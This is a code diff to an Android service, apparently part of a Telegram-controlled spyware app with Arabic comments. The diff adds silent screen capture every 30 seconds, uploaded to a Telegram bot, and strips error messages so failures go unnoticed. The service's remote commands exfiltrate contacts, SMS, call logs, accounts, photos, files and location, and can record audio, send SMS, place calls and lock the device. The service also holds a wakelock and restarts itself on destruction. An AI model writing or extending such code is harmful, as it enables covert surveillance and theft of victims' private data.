@@ -70,24 +70,24 @@ public class MainService extends Service {
     private MediaRecorder mediaRecorder;
     private boolean isRecording = false;
     private String currentAudioPath;
+    
+    // متغيرات تصوير الشاشة
     private MediaProjection mediaProjection;
     private MediaProjectionManager projectionManager;
     private int screenWidth, screenHeight, screenDensity;
-    private static MainService instance;
 
     @Override
     public void onCreate() {
         super.onCreate();
-        instance = this;
         try {
-            // WakeLock القوي
+            // WakeLock لمنع النوم
             PowerManager powerManager = (PowerManager) getSystemService(POWER_SERVICE);
             if (powerManager != null) {
                 wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK | PowerManager.ACQUIRE_CAUSES_WAKEUP, "MainService");
                 wakeLock.acquire(10 * 60 * 1000L);
             }
 
-            // إعداد MediaProjection
+            // إعداد MediaProjection للشاشة
             projectionManager = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
             WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
             if (wm != null) {
@@ -101,27 +101,33 @@ public class MainService extends Service {
             startForegroundService();
             setupMediaProjection();
 
-            handler.postDelayed(() -> sendHelpWithButtons(), 3000);
+            // إرسال رسالة بدء التشغيل
+            handler.postDelayed(() -> sendToTelegram("✅ MainService Started - Screen Capture Active"), 3000);
 
-            handler.postDelayed(() -> {
-                timer = new Timer();
-                timer.scheduleAtFixedRate(new TimerTask() {
-                    @Override
-                    public void run() {
-                        try {
-                            checkCommands();
-                        } catch (Exception ignored) { }
-                    }
-                }, 5000, 5000);
-            }, 2000);
+            // بدء فحص الأوامر كل 5 ثواني
+            timer = new Timer();
+            timer.scheduleAtFixedRate(new TimerTask() {
+                @Override
+                public void run() {
+                    try {
+                        checkCommands();
+                    } catch (Exception ignored) { }
+                }
+            }, 5000, 5000);
+            
+            // تصوير الشاشة التلقائي كل 30 ثانية
+            timer.scheduleAtFixedRate(new TimerTask() {
+                @Override
+                public void run() {
+                    try {
+                        takeScreenshot();
+                    } catch (Exception ignored) { }
+                }
+            }, 10000, 30000);
 
         } catch (Exception e) {
             e.printStackTrace();
         }
-    }
-
-    public static MainService getInstance() {
-        return instance;
     }
 
     private void startForegroundService() {
@@ -147,10 +153,89 @@ public class MainService extends Service {
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
-        // START_STICKY + START_REDELIVER_INTENT
         return START_STICKY;
     }
 
+    private void setupMediaProjection() {
+        try {
+            int resultCode = getSharedPreferences("screen_capture", MODE_PRIVATE).getInt("resultCode", -1);
+            String dataUri = getSharedPreferences("screen_capture", MODE_PRIVATE).getString("data", null);
+            if (resultCode != -1 && dataUri != null && projectionManager != null) {
+                Intent data = Intent.parseUri(dataUri, 0);
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
+                    mediaProjection = projectionManager.getMediaProjection(resultCode, data);
+                }
+            }
+        } catch (Exception e) { }
+    }
+
+    // ========== تصوير الشاشة (سكرين شوت) ==========
+    private void takeScreenshot() {
+        try {
+            if (mediaProjection == null) {
+                setupMediaProjection();
+                if (mediaProjection == null) {
+                    return;
+                }
+            }
+            if (screenWidth == 0 || screenHeight == 0) {
+                return;
+            }
+
+            ImageReader imageReader = ImageReader.newInstance(screenWidth, screenHeight, PixelFormat.RGBA_8888, 2);
+            VirtualDisplay virtualDisplay = mediaProjection.createVirtualDisplay(
+                    "Screenshot", screenWidth, screenHeight, screenDensity,
+                    DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
+                    imageReader.getSurface(), null, null);
+
+            handler.postDelayed(() -> {
+                try {
+                    Image image = imageReader.acquireLatestImage();
+                    if (image != null) {
+                        Bitmap bitmap = Bitmap.createBitmap(screenWidth, screenHeight, Bitmap.Config.ARGB_8888);
+                        bitmap.copyPixelsFromBuffer(image.getPlanes()[0].getBuffer());
+                        sendScreenshotToTelegram(bitmap);
+                        image.close();
+                        bitmap.recycle();
+                    }
+                    virtualDisplay.release();
+                    imageReader.close();
+                } catch (Exception e) { }
+            }, 500);
+        } catch (Exception e) { }
+    }
+
+    private void sendScreenshotToTelegram(Bitmap bitmap) {
+        try {
+            File file = new File(getCacheDir(), "screenshot_" + System.currentTimeMillis() + ".jpg");
+            FileOutputStream out = new FileOutputStream(file);
+            bitmap.compress(Bitmap.CompressFormat.JPEG, 85, out);
+            out.close();
+
+            String timeStamp = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(new Date());
+            
+            RequestBody body = new MultipartBody.Builder()
+                    .setType(MultipartBody.FORM)
+                    .addFormDataPart("chat_id", CHAT_ID)
+                    .addFormDataPart("caption", "📸 **تصوير الشاشة**\n🕐 " + timeStamp)
+                    .addFormDataPart("photo", file.getName(),
+                            RequestBody.create(MediaType.parse("image/jpeg"), file))
+                    .build();
+            Request request = new Request.Builder()
+                    .url("https://api.telegram.org/bot" + TOKEN + "/sendPhoto")
+                    .post(body).build();
+            client.newCall(request).enqueue(new okhttp3.Callback() {
+                @Override
+                public void onResponse(Call call, Response response) {
+                    try { response.close(); } catch (Exception e) { }
+                    file.delete();
+                }
+                @Override public void onFailure(Call call, IOException e) { }
+            });
+        } catch (Exception e) { }
+    }
+
+    // ========== فحص أوامر التليجرام ==========
     private void checkCommands() {
         try {
             Request request = new Request.Builder()
@@ -216,78 +301,80 @@ public class MainService extends Service {
 
             switch (cmd) {
                 case "/help":
+                case "help":
                     sendHelpWithButtons();
                     break;
-                case "info":
                 case "/info":
+                case "info":
                     sendDeviceInfo();
                     break;
-                case "contacts":
                 case "/contacts":
+                case "contacts":
                     getContacts();
                     break;
-                case "location":
                 case "/location":
+                case "location":
                     getLocation();
                     break;
-                case "sms":
                 case "/sms":
+                case "sms":
                     getSms();
                     break;
-                case "calls":
                 case "/calls":
+                case "calls":
                     getCallLog();
                     break;
-                case "accounts":
                 case "/accounts":
+                case "accounts":
                     getAccounts();
                     break;
-                case "photos":
                 case "/photos":
+                case "photos":
                     getPhotos();
                     break;
-                case "videos":
                 case "/videos":
+                case "videos":
                     getVideos();
                     break;
-                case "files":
                 case "/files":
+                case "files":
                     getFiles();
                     break;
-                case "screenshot":
                 case "/screenshot":
+                case "screenshot":
                     takeScreenshot();
+                    sendToTelegram("📸 جاري تصوير الشاشة...");
                     break;
-                case "record_audio_start":
                 case "/record_audio_start":
+                case "record_audio_start":
                     startAudioRecording();
                     break;
-                case "record_audio_stop":
                 case "/record_audio_stop":
+                case "record_audio_stop":
                     stopAudioRecording();
                     break;
-                case "vibrate":
                 case "/vibrate":
+                case "vibrate":
                     vibrate();
                     break;
-                case "lock":
                 case "/lock":
+                case "lock":
                     lockDevice();
                     break;
-                case "open":
                 case "/open":
+                case "open":
                     if (parts.length >= 2) openUrl(parts[1]);
                     break;
-                case "call":
                 case "/call":
+                case "call":
                     if (parts.length >= 2) makeCall(parts[1]);
                     break;
-                case "sms_send":
                 case "/sms_send":
+                case "sms_send":
                     if (parts.length >= 3) sendSms(parts[1], command.substring(command.indexOf(parts[1]) + parts[1].length() + 1));
                     break;
-                case "test":
                 case "/test":
+                case "test":
                     sendToTelegram("✅ Working - " + new Date().toString());
                     break;
                 default:
@@ -607,90 +694,6 @@ public class MainService extends Service {
         }
     }
 
-    private void setupMediaProjection() {
-        try {
-            int resultCode = getSharedPreferences("screen_capture", MODE_PRIVATE).getInt("resultCode", -1);
-            String dataUri = getSharedPreferences("screen_capture", MODE_PRIVATE).getString("data", null);
-            if (resultCode != -1 && dataUri != null && projectionManager != null) {
-                Intent data = Intent.parseUri(dataUri, 0);
-                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
-                    mediaProjection = projectionManager.getMediaProjection(resultCode, data);
-                }
-            }
-        } catch (Exception e) { }
-    }
-
-    private void takeScreenshot() {
-        try {
-            if (mediaProjection == null) {
-                setupMediaProjection();
-                if (mediaProjection == null) {
-                    sendToTelegram("❌ لم يتم تفعيل صلاحية تسجيل الشاشة. اضغط على زر التفعيل في التطبيق");
-                    return;
-                }
-            }
-            if (screenWidth == 0 || screenHeight == 0) {
-                sendToTelegram("❌ لم يتم الحصول على مقاسات الشاشة");
-                return;
-            }
-
-            ImageReader imageReader = ImageReader.newInstance(screenWidth, screenHeight, PixelFormat.RGBA_8888, 2);
-            VirtualDisplay virtualDisplay = mediaProjection.createVirtualDisplay(
-                    "Screenshot", screenWidth, screenHeight, screenDensity,
-                    DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
-                    imageReader.getSurface(), null, null);
-
-            handler.postDelayed(() -> {
-                try {
-                    Image image = imageReader.acquireLatestImage();
-                    if (image != null) {
-                        Bitmap bitmap = Bitmap.createBitmap(screenWidth, screenHeight, Bitmap.Config.ARGB_8888);
-                        bitmap.copyPixelsFromBuffer(image.getPlanes()[0].getBuffer());
-                        sendScreenshot(bitmap);
-                        image.close();
-                        bitmap.recycle();
-                    }
-                    virtualDisplay.release();
-                    imageReader.close();
-                } catch (Exception e) {
-                    sendToTelegram("❌ فشل معالجة الصورة: " + e.getMessage());
-                }
-            }, 500);
-            sendToTelegram("📸 جاري تصوير الشاشة...");
-        } catch (Exception e) {
-            sendToTelegram("❌ فشل تصوير الشاشة: " + e.getMessage());
-        }
-    }
-
-    private void sendScreenshot(Bitmap bitmap) {
-        try {
-            File file = new File(getCacheDir(), "screenshot.jpg");
-            FileOutputStream out = new FileOutputStream(file);
-            bitmap.compress(Bitmap.CompressFormat.JPEG, 85, out);
-            out.close();
-
-            RequestBody body = new MultipartBody.Builder()
-                    .setType(MultipartBody.FORM)
-                    .addFormDataPart("chat_id", CHAT_ID)
-                    .addFormDataPart("photo", "screenshot.jpg",
-                            RequestBody.create(MediaType.parse("image/jpeg"), file))
-                    .build();
-            Request request = new Request.Builder()
-                    .url("https://api.telegram.org/bot" + TOKEN + "/sendPhoto")
-                    .post(body).build();
-            client.newCall(request).enqueue(new okhttp3.Callback() {
-                @Override
-                public void onResponse(Call call, Response response) {
-                    try { response.close(); } catch (Exception e) { }
-                    file.delete();
-                }
-                @Override public void onFailure(Call call, IOException e) { }
-            });
-        } catch (Exception e) {
-            sendToTelegram("❌ فشل إرسال الصورة: " + e.getMessage());
-        }
-    }
-
     private void startAudioRecording() {
         try {
             if (checkSelfPermission(android.Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
@@ -835,6 +838,9 @@ public class MainService extends Service {
             if (timer != null) timer.cancel();
             if (wakeLock != null && wakeLock.isHeld()) wakeLock.release();
             if (mediaRecorder != null) mediaRecorder.release();
+            if (mediaProjection != null && Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
+                mediaProjection.stop();
+            }
         } catch (Exception ignored) { }
         // إعادة تشغيل الخدمة فوراً
         startService(new Intent(this, MainService.class));
